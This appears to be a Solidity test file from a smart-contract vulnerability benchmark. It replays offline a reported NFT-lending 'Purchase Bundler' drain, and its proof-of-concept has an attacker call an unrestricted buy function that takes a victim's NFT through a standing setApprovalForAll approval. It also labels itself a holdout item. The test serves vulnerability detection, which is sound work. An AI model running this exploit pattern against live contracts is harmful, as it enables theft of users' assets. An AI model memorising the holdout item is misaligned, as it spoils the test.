// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {GondiMiniERC721, GondiBundlerClone} from
    "../fixtures/set-approval-for-all/b-incident/GondiBundlerClone.sol";

/// @title set-approval-for-all (b) real-incident HOLDOUT: Gondi NFT-lending "Purchase Bundler" drain.
/// @notice Minimized OFFLINE replay (no live RPC) of the 2026-03-09 Gondi drain (~$230K, ~78 NFTs
///         across ~40 txs, Ethereum). Victims held a lingering `setApprovalForAll(bundler, true)`
///         over blue-chip collections (Art Blocks, Doodles, ...). The updated "Purchase Bundler"
///         exposed an unrestricted `buy` whose bundled execution never checked the caller's relation
///         to the moved NFTs, so the attacker called `buy` naming victims' idle NFTs and the bundler
///         pulled them with the victims' standing operator approval and delivered them to the
///         attacker. The verdict is derived from the real outcome (the victim's NFT ends up at the
///         attacker), not hardcoded. HOLDOUT (label=vuln). Facts/sources: fixture PROVENANCE.md.
contract GondiBundlerIncidentTest is Test {
    function _report(string memory target, bool drained) internal pure {
        console.log(
            string.concat(
                "[set-approval-for-all] target=", target, " verdict=", drained ? "VULNERABLE" : "BLOCKED"
            )
        );
    }

    function test_gondiBundlerOperatorApprovalDrain_isDrained() public {
        GondiMiniERC721 collection = new GondiMiniERC721(); // e.g. Art Blocks (0xfbeef911...)
        GondiBundlerClone bundler = new GondiBundlerClone();

        // Victim holds an idle NFT and, like the real victims, left a blanket operator approval to the
        // bundler standing from an earlier legitimate lending interaction.
        address victim = makeAddr("victim"); // real example victim: 0xfaa9dccf86f5cd4db872377c18368b5d58bc7b38
        uint256 victimTokenId = 54218; // Art Blocks #54218 was one of the real drained tokens in the pinned tx
        collection.mint(victim, victimTokenId);
        vm.prank(victim);
        collection.setApprovalForAll(address(bundler), true);

        address attacker = makeAddr("attacker"); // real: 0x8d171c74c85cd2ec9f38143dd5d8a7c89df47051
        assertEq(collection.ownerOf(victimTokenId), victim, "precondition: victim owns the NFT");

        // The attacker calls the unrestricted `buy`, naming the victim's idle NFT as a leg.
        GondiBundlerClone.BuyLeg[] memory legs = new GondiBundlerClone.BuyLeg[](1);
        legs[0] = GondiBundlerClone.BuyLeg({collection: collection, tokenId: victimTokenId, holder: victim});
        vm.prank(attacker);
        bundler.buy(legs);

        bool drained = collection.ownerOf(victimTokenId) == attacker;
        _report("gondi-bundler-victim", drained);

        assertTrue(drained, "unrestricted buy + lingering setApprovalForAll should drain the victim's NFT");
    }
}
